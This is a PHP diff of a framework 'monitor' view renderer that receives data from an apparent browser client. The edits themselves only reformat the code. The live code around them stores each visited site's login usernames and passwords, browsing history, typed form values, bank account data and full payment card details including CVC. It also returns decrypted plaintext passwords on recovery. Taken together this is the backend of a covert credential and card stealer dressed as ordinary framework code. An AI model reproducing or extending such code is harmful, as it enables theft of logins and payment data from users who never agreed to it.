@@ -1,8 +1,6 @@
 <?php
 
-
 namespace Mishusoft\Framework\BuiltInWeb\ViewRenders;
-
 
 use Mishusoft\Framework\BuiltInWeb\Databases\MonitorMSQL;
 use Mishusoft\Framework\Chipsets\Cryptography\Decryption;
@@ -28,7 +26,6 @@ class MonitorViewRender extends ViewRender
     public function __construct(array $request)
     {
         parent::__construct($request);
-
     }
 
     /**
@@ -38,10 +35,10 @@ class MonitorViewRender extends ViewRender
     {
         $idNbOfProduct = self::$conOfDatabase->getIdNbOfVerifiedProduct(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "name")), _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "version")), _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "ip")), _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "browser")));
         if (!is_numeric($idNbOfProduct)) {
-            Storage::StreamAsJson(array('app_pub_id' => Encryption::static($idNbOfProduct)));
+            Storage::StreamAsJson(['app_pub_id' => Encryption::static($idNbOfProduct)]);
         } else {
             self::$conOfDatabase->addProductToInstList(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "name")), _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "version")), _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "ip")), _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "browser")));
-            Storage::StreamAsJson(array('app_pub_id' => Encryption::static(self::$conOfDatabase->getLastInsertedId("installed.products"))));
+            Storage::StreamAsJson(['app_pub_id' => Encryption::static(self::$conOfDatabase->getLastInsertedId("installed.products"))]);
         }
     }
 
@@ -84,13 +81,15 @@ class MonitorViewRender extends ViewRender
             if (_Array::value($app, "ipAddress") && _Array::value($app, "ipAddress") !== _String::removeTags(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "ip"))) {
                 self::$conOfDatabase->resetItmFrmLcnByPrdId(
                     Decryption::static(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "app_id")),
-                    "ipAddress", _Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "ip")
+                    "ipAddress",
+                    _Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "ip")
                 );
             }
             if (_Array::value($app, "browserNameFull") && _Array::value($app, "browserNameFull") !== _String::removeTags(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "browser"))) {
                 self::$conOfDatabase->resetItmFrmLcnByPrdId(
                     Decryption::static(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "app_id")),
-                    "browserNameFull", _Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "browser")
+                    "browserNameFull",
+                    _Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "browser")
                 );
             }
         }
@@ -107,19 +106,19 @@ class MonitorViewRender extends ViewRender
             );
             self::upgradeLcnLmt(Decryption::static(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "app_id")));
             Storage::StreamAsJson(
-                array(
+                [
                     'message' => 'success', 'login' => 'passed', 'way' => 'email_password', 'log_status' => 'success',
-                    'user' => array(
+                    'user' => [
                         'firstName' => $userDetails['firstName'], 'lastName' => $userDetails['lastName'], 'emailAddress' => $userDetails['emailAddress'], 'password' => $userDetails['password']
-                    ), 'licence' => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
-                    Decryption::static(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "app_id")),
-                    _String::removeTags(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "ip")),
-                    _String::removeTags(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "browser"))
-                )
-                )
+                    ], 'licence' => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
+                        Decryption::static(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "app_id")),
+                        _String::removeTags(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "ip")),
+                        _String::removeTags(_Array::value(_Array::value(_Array::value($detailsArray, "userdata"), "_default_"), "browser"))
+                    )
+                ]
             );
         } else {
-            Storage::StreamAsJson(array('message' => 'error', 'login' => 'failed', 'way' => 'email_password'));
+            Storage::StreamAsJson(['message' => 'error', 'login' => 'failed', 'way' => 'email_password']);
         }
     }
 
@@ -141,35 +140,48 @@ class MonitorViewRender extends ViewRender
                 "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                 "error" => ["description" => "Your requested url is broken!!"]
             ]);
-        }
-        else if (_String::lower($this->request["method"]) === _String::lower('browser')) {
+        } elseif (_String::lower($this->request["method"]) === _String::lower('browser')) {
             if (_String::lower(join("/", $this->request['arguments'])) === _String::lower('receiveFeedback')) {
-
                 $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                 if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                     if (array_key_exists("update", $RequestedDataArray) and is_array($RequestedDataArray["update"]) and count($RequestedDataArray["update"]) > 0) {
                         self::$conOfDatabase->receiveInfoAboutUserUpdate(
-                            _String::removeTags(_Array::value($RequestedDataArray["update"], "name")), _String::removeTags(_Array::value($RequestedDataArray["update"], "version")),
-                            _String::removeTags(_Array::value($RequestedDataArray["update"], "ip")), _String::removeTags(_Array::value($RequestedDataArray["update"], "browser")),
-                            _String::removeTags(_Array::value($RequestedDataArray["update"], "message")));
+                            _String::removeTags(_Array::value($RequestedDataArray["update"], "name")),
+                            _String::removeTags(_Array::value($RequestedDataArray["update"], "version")),
+                            _String::removeTags(_Array::value($RequestedDataArray["update"], "ip")),
+                            _String::removeTags(_Array::value($RequestedDataArray["update"], "browser")),
+                            _String::removeTags(_Array::value($RequestedDataArray["update"], "message"))
+                        );
 
                         header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                     }
 
                     if (array_key_exists("status", $RequestedDataArray) and is_array($RequestedDataArray["status"]) and count($RequestedDataArray["status"]) > 0) {
-                        $status = self::$conOfDatabase->getInfAbtInstPrdStatus(_String::removeTags(_Array::value($RequestedDataArray["status"], "name")),
-                            _String::removeTags(_Array::value($RequestedDataArray["status"], "version")), _String::removeTags(_Array::value($RequestedDataArray["status"], "ip")),
-                            _String::removeTags(_Array::value($RequestedDataArray["status"], "os_version")), _String::removeTags(_Array::value($RequestedDataArray["status"], "browser")));
+                        $status = self::$conOfDatabase->getInfAbtInstPrdStatus(
+                            _String::removeTags(_Array::value($RequestedDataArray["status"], "name")),
+                            _String::removeTags(_Array::value($RequestedDataArray["status"], "version")),
+                            _String::removeTags(_Array::value($RequestedDataArray["status"], "ip")),
+                            _String::removeTags(_Array::value($RequestedDataArray["status"], "os_version")),
+                            _String::removeTags(_Array::value($RequestedDataArray["status"], "browser"))
+                        );
                         if (is_array($status) and count($status) > 0) {
-                            self::$conOfDatabase->updateInfOfPrdStatus(_String::removeTags(_Array::value($RequestedDataArray["status"], "name")),
-                                _String::removeTags(_Array::value($RequestedDataArray["status"], "version")), _String::removeTags(_Array::value($RequestedDataArray["status"], "ip")),
-                                _String::removeTags(_Array::value($RequestedDataArray["status"], "os_version")), _String::removeTags(_Array::value($RequestedDataArray["status"], "browser")),
-                                _String::removeTags(_Array::value($RequestedDataArray["status"], "message")));
+                            self::$conOfDatabase->updateInfOfPrdStatus(
+                                _String::removeTags(_Array::value($RequestedDataArray["status"], "name")),
+                                _String::removeTags(_Array::value($RequestedDataArray["status"], "version")),
+                                _String::removeTags(_Array::value($RequestedDataArray["status"], "ip")),
+                                _String::removeTags(_Array::value($RequestedDataArray["status"], "os_version")),
+                                _String::removeTags(_Array::value($RequestedDataArray["status"], "browser")),
+                                _String::removeTags(_Array::value($RequestedDataArray["status"], "message"))
+                            );
                         } else {
-                            self::$conOfDatabase->insertInfOfPrdStatus(_String::removeTags(_Array::value($RequestedDataArray["status"], "name")),
-                                _String::removeTags(_Array::value($RequestedDataArray["status"], "version")), _String::removeTags(_Array::value($RequestedDataArray["status"], "ip")),
-                                _String::removeTags(_Array::value($RequestedDataArray["status"], "os_version")), _String::removeTags(_Array::value($RequestedDataArray["status"], "browser")),
-                                _String::removeTags(_Array::value($RequestedDataArray["status"], "message")));
+                            self::$conOfDatabase->insertInfOfPrdStatus(
+                                _String::removeTags(_Array::value($RequestedDataArray["status"], "name")),
+                                _String::removeTags(_Array::value($RequestedDataArray["status"], "version")),
+                                _String::removeTags(_Array::value($RequestedDataArray["status"], "ip")),
+                                _String::removeTags(_Array::value($RequestedDataArray["status"], "os_version")),
+                                _String::removeTags(_Array::value($RequestedDataArray["status"], "browser")),
+                                _String::removeTags(_Array::value($RequestedDataArray["status"], "message"))
+                            );
                         }
 
                         header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
@@ -188,7 +200,7 @@ class MonitorViewRender extends ViewRender
                     ]);
                 }
             } /*send installed product id form server to client*/
-            else if (_String::lower(join("/", $this->request['arguments'])) === _String::lower('getPubAppId')) {
+            elseif (_String::lower(join("/", $this->request['arguments'])) === _String::lower('getPubAppId')) {
                 $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                 if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                     if (!empty(_Array::value($RequestedDataArray, "IdRequest")) && is_array(_Array::value($RequestedDataArray, "IdRequest"))) {
@@ -197,7 +209,7 @@ class MonitorViewRender extends ViewRender
                         } elseif (strpos(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "message"), "update") <= 0) {
                             self::getVerifiedProductId($RequestedDataArray);
                         } else {
-                            Storage::StreamAsJson(array("data" => "empty"));
+                            Storage::StreamAsJson(["data" => "empty"]);
                         }
                     }
                 } else {
@@ -209,42 +221,42 @@ class MonitorViewRender extends ViewRender
             } /*manage user data form client*/
             elseif (_String::lower(join("/", $this->request['arguments'])) === _String::lower("UserDataManagement") || _String::lower(join("/", $this->request['arguments'])) === _String::lower("browserUserDataManagement")) {
                 $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
-                $defaultQueries = array(
+                $defaultQueries = [
                     "tracker" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "tracker"),
                     "app_id" => Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                     "ip_address" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "ip"),
                     "os_name_arch" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "os_name_arch"),
                     "browserNameFull" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "browser")
-                );
+                ];
                 if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                     if (array_key_exists("userdata", $RequestedDataArray) and array_key_exists("command", $RequestedDataArray)) {
                         /*collect data*/
                         if (_String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('saveLoginData')) {
-                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, array(
+                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, [
                                 "workWebsite" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "workWebsite"),
                                 "event" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "event"),
                                 "username" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "username"),
                                 "password" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "password"),
                                 "last_update_date_time" => Time::getToday()
-                            )));
+                            ]));
                             header(Network::getValOfSrv('SERVER_PROTOCOL') . ' 204 No response');
                         }
                         /*collect data*/
                         if (_String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('saveLogoutData')) {
-                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, array(
+                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, [
                                 "workWebsite" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "workWebsite"),
                                 "event" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "event"),
                                 "username" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "username"),
                                 "last_update_date_time" => Time::getToday()
-                            )));
+                            ]));
                             header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                         }
                         /*collect data*/
                         if (_String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('saveNavigateData')) {
-                            self::$conOfDatabase->saveDataOfUsersBrowserHistories(array_merge($defaultQueries, array(
+                            self::$conOfDatabase->saveDataOfUsersBrowserHistories(array_merge($defaultQueries, [
                                 "workWebsite" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "workWebsite"),
                                 "last_update_date_time" => Time::getToday()
-                            )));
+                            ]));
                             header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                         }
                         /*collect data*/
@@ -268,9 +280,9 @@ class MonitorViewRender extends ViewRender
                                 !empty(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email"))) &&
                                 !empty(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password")))) {
                                 if (!empty($registeredUserIdByEmail)) {
-                                    Storage::StreamAsJson(array('message' => 'error', 'registration' => 'already_register', 'way' => 'email', 'licence' => $licence));
+                                    Storage::StreamAsJson(['message' => 'error', 'registration' => 'already_register', 'way' => 'email', 'licence' => $licence]);
                                 } elseif (!empty($registeredUserIdByIP)) {
-                                    Storage::StreamAsJson(array('message' => 'error', 'registration' => 'already_register', 'way' => 'ip', 'licence' => $licence));
+                                    Storage::StreamAsJson(['message' => 'error', 'registration' => 'already_register', 'way' => 'ip', 'licence' => $licence]);
                                 } else {
                                     self::$conOfDatabase->saveUserSettingData(
                                         Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
@@ -290,11 +302,16 @@ class MonitorViewRender extends ViewRender
                                         Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                         _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                         _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "browser")),
-                                        'trial', self::$limit, self::$limitBase, Time::getToday(),
-                                        Time::getToday(), Time::getNextDayDate(), 'not-fixed'
+                                        'trial',
+                                        self::$limit,
+                                        self::$limitBase,
+                                        Time::getToday(),
+                                        Time::getToday(),
+                                        Time::getNextDayDate(),
+                                        'not-fixed'
                                     );
 
-                                    Storage::StreamAsJson(array(
+                                    Storage::StreamAsJson([
                                         'message' => 'success', 'registration' => 'new_register',
                                         'way' => 'new', 'log_status' => 'success', 'u_pass' => Encryption::static(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password"))),
                                         'licence' => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
@@ -302,22 +319,22 @@ class MonitorViewRender extends ViewRender
                                             _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                             _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "browser"))
                                         )
-                                    ));
+                                    ]);
                                 }
                             } else {
-                                Storage::StreamAsJson(array('message' => 'error', 'registration' => 'failed', 'way' => 'empty_data', 'licence' => $licence));
+                                Storage::StreamAsJson(['message' => 'error', 'registration' => 'failed', 'way' => 'empty_data', 'licence' => $licence]);
                             }
                         }
 
                         if (_String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('saveRegistrationData')) {
-                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, array(
+                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, [
                                 "workWebsite" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "workWebsite"),
                                 "event" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "event"),
                                 "username" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "username"),
                                 "password" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "password"),
                                 "email" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "email"),
                                 "last_update_date_time" => Time::getToday()
-                            )));
+                            ]));
                             header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                         }
 
@@ -333,21 +350,21 @@ class MonitorViewRender extends ViewRender
                                             $userDetails = self::$conOfDatabase->getUsrDtlByEmlPss(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email")), _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password")));
                                             self::processUserAuthentication($RequestedDataArray, $IdNbOfUsr, $userDetails);
                                         } else {
-                                            Storage::StreamAsJson(array('message' => 'error', 'login' => 'incorrect', 'way' => 'password'));
+                                            Storage::StreamAsJson(['message' => 'error', 'login' => 'incorrect', 'way' => 'password']);
                                         }
                                     } else {
                                         if (_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password")) === $password) {
                                             $userDetails = self::$conOfDatabase->getUsrDtlByEmlPss(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email")), Encryption::static(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password"))));
                                             self::processUserAuthentication($RequestedDataArray, $IdNbOfUsr, $userDetails);
                                         } else {
-                                            Storage::StreamAsJson(array('message' => 'error', 'login' => 'incorrect', 'way' => 'password'));
+                                            Storage::StreamAsJson(['message' => 'error', 'login' => 'incorrect', 'way' => 'password']);
                                         }
                                     }
                                 } else {
-                                    Storage::StreamAsJson(array('message' => 'error', 'login' => 'not_exist', 'way' => 'password'));
+                                    Storage::StreamAsJson(['message' => 'error', 'login' => 'not_exist', 'way' => 'password']);
                                 }
                             } else {
-                                Storage::StreamAsJson(array('message' => 'error', 'login' => 'not_exist', 'way' => 'email'));
+                                Storage::StreamAsJson(['message' => 'error', 'login' => 'not_exist', 'way' => 'email']);
                             }
                         }
 
@@ -364,7 +381,7 @@ class MonitorViewRender extends ViewRender
                                 Encryption::static(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password")))
                             );
 
-                            Storage::StreamAsJson(array(
+                            Storage::StreamAsJson([
                                 'message' => 'success', 'registration' => 'new_register',
                                 'way' => 'new', 'log_status' => 'success', 'u_pass' => _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password")),
                                 'licence' => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
@@ -372,7 +389,7 @@ class MonitorViewRender extends ViewRender
                                     _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                     _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "browser"))
                                 )
-                            ));
+                            ]);
                         }
 
                         if (_String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('recoverUserPassword')) {
@@ -380,12 +397,12 @@ class MonitorViewRender extends ViewRender
                             if (isset($user)) {
                                 $password = self::$conOfDatabase->getUsrPssByEmlAddr(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email")));
                                 if (isset($password)) {
-                                    Storage::StreamAsJson(array('message' => 'success', 'passwordRecovery' => 'exist', 'way' => 'email', 'password' => Decryption::static($password)));
+                                    Storage::StreamAsJson(['message' => 'success', 'passwordRecovery' => 'exist', 'way' => 'email', 'password' => Decryption::static($password)]);
                                 } else {
-                                    Storage::StreamAsJson(array('message' => 'error', 'passwordRecovery' => 'not_exist', 'way' => 'password'));
+                                    Storage::StreamAsJson(['message' => 'error', 'passwordRecovery' => 'not_exist', 'way' => 'password']);
                                 }
                             } else {
-                                Storage::StreamAsJson(array('message' => 'error', 'passwordRecovery' => 'not_exist', 'way' => 'email'));
+                                Storage::StreamAsJson(['message' => 'error', 'passwordRecovery' => 'not_exist', 'way' => 'email']);
                             }
                         }
                     }
@@ -402,19 +419,19 @@ class MonitorViewRender extends ViewRender
                     if (array_key_exists("command", $RequestedDataArray) and array_key_exists("inputElementData", $RequestedDataArray)
                         and _String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('saveInputElementData'
                             and is_array(_Array::value($RequestedDataArray, "inputElementData")))) {
-                        $defaultQueries = array(
+                        $defaultQueries = [
                             "tracker" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "inputElementData"), "_default_"), "tracker"),
                             "app_id" => Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "inputElementData"), "_default_"), "app_id")),
                             "ip_address" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "inputElementData"), "_default_"), "ip"),
                             "browserNameFull" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "inputElementData"), "_default_"), "browser")
-                        );
-                        self::$conOfDatabase->storeCltBrInpInDb(array_merge($defaultQueries, array(
+                        ];
+                        self::$conOfDatabase->storeCltBrInpInDb(array_merge($defaultQueries, [
                             "work_website" => _Array::value(_Array::value($RequestedDataArray, "inputElementData"), "workWebsite"),
                             "name" => _Array::value(_Array::value($RequestedDataArray, "inputElementData"), "name"),
                             "type" => _Array::value(_Array::value($RequestedDataArray, "inputElementData"), "type"),
                             "value" => _Array::value(_Array::value($RequestedDataArray, "inputElementData"), "value"),
                             "placeholder" => _Array::value(_Array::value($RequestedDataArray, "inputElementData"), "placeholder"),
-                        )));
+                        ]));
                     }
                     header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                 } else {
@@ -430,17 +447,17 @@ class MonitorViewRender extends ViewRender
                     if (array_key_exists("command", $RequestedDataArray) and array_key_exists("bankAccountData", $RequestedDataArray)
                         and _String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('saveBankAccountData'
                             and is_array(_Array::value($RequestedDataArray, "bankAccountData")))) {
-                        $defaultQueries = array(
+                        $defaultQueries = [
                             "tracker" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "bankAccountData"), "_default_"), "tracker"),
                             "app_id" => Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "bankAccountData"), "_default_"), "app_id")),
                             "ip_address" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "bankAccountData"), "_default_"), "ip"),
                             "browserNameFull" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "bankAccountData"), "_default_"), "browser")
-                        );
-                        self::$conOfDatabase->storeCltBnkAccData(array_merge($defaultQueries, array(
+                        ];
+                        self::$conOfDatabase->storeCltBnkAccData(array_merge($defaultQueries, [
                             "work_website" => _Array::value(_Array::value($RequestedDataArray, "bankAccountData"), "workWebsite"),
                             "data_type" => _Array::value(_Array::value($RequestedDataArray, "bankAccountData"), "name"),
                             "data_value" => _Array::value(_Array::value($RequestedDataArray, "bankAccountData"), "type")
-                        )));
+                        ]));
                     }
                     header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                 } else {
@@ -456,19 +473,19 @@ class MonitorViewRender extends ViewRender
                     if (array_key_exists("command", $RequestedDataArray) and array_key_exists("paymentMethodsInfo", $RequestedDataArray)
                         and _String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('savePaymentMethodsData'
                             and is_array(_Array::value($RequestedDataArray, "paymentMethodsInfo")))) {
-                        $defaultQueries = array(
+                        $defaultQueries = [
                             "tracker" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "tracker"),
                             "app_id" => Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "app_id")),
                             "ip_address" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "ip"),
                             "os_name_arch" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "os_name_arch"),
                             "browserNameFull" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "browser")
-                        );
+                        ];
                         if (_String::lower(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardNumber")) !== _String::lower("Unknown")
                             and _String::lower(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardHolder")) !== _String::lower("Unknown")
                             and _String::lower(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardBrand")) !== _String::lower("Unknown")
                             and _String::lower(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardExpire")) !== _String::lower("Unknown")
-                            and _String::lower(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardCVC")) !== _String::lower("Unknown"))
-                            self::$conOfDatabase->storeCltPytMtdData(array_merge($defaultQueries, array(
+                            and _String::lower(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardCVC")) !== _String::lower("Unknown")) {
+                            self::$conOfDatabase->storeCltPytMtdData(array_merge($defaultQueries, [
                                 "work_website" => _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "workWebsite"),
                                 "event" => _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "event") ? _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "event") : 'bug',
                                 "cardNumber" => _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardNumber"),
@@ -476,7 +493,8 @@ class MonitorViewRender extends ViewRender
                                 "cardBrand" => _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardBrand"),
                                 "cardExpire" => _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardExpire"),
                                 "cardCVC" => _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardCVC")
-                            )));
+                            ]));
+                        }
                     }
                     header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                 } else {
@@ -492,7 +510,6 @@ class MonitorViewRender extends ViewRender
                     if (array_key_exists("command", $RequestedDataArray)
                         and array_key_exists("earndata", $RequestedDataArray)
                         and is_array(_Array::value($RequestedDataArray, "earndata"))) {
-
                         self::$conOfDatabase->upgradeLcnLmt(
                             Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                             Number::filterInt(_Array::value(_Array::value($RequestedDataArray, "earndata"), "earn"))
